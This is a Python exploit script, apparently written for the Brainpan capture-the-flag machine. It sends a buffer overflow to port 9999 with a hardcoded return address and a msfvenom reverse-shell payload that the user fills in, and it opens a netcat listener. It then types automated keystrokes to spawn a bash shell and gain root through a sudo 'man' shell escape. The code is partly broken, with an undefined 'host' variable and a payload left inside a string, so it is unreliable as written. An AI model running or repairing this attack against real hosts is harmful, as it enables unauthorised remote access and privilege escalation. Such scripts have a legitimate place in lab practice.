#!/usr/bin/python3 

#
#You need to cahnge keyboard layout to en.
#
#Create a new shell code with that instruction above the previuosly set one with
#the desired ip to send the reverse shell and uncomment it
#

from time import sleep
import os, subprocess, socket, sys, pyautogui

def enter():
    pyautogui.press('enter')

def BufferOverflow():

    if len(sys.argv) == 2:
        rhost = sys.argv[1]
    else:
        print("USAGE: python3 autopwn.py <RHOST>")
        
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    sleep(1)
    print(s.recv(1024))
    print("\n" + "exploiting...." + "\n")
    """
    #sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=6989  -f py -b "\x00"
    buf = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    buf += b"\x90\x90\x90\x90"
    """
    #BadChars: \x00
    #RetAddress: 0x311712f3
    buffer = b'\x90' * 524
    buffer += b'\xf3\x12\x17\x31'
    buffer += b'\x90' * 8
    buffer += buf

    sleep(1)
    s.send(buffer)
    sleep(1)

    s.close()

pid = os.fork()

if pid > 0:
    os.system("nc -lvnp 6989")

elif pid == 0:

    subprocess.run("clear")
    BufferOverflow()

    pyautogui.write("id")
    enter()

    pyautogui.write("script /dev/null -c bash")
    enter()

    pyautogui.write("sudo /home/anansi/bin/anansi_util manual man")
    enter()

    pyautogui.write("!")
    enter()

    pyautogui.write("id")
    enter()

else:
    print("Error")
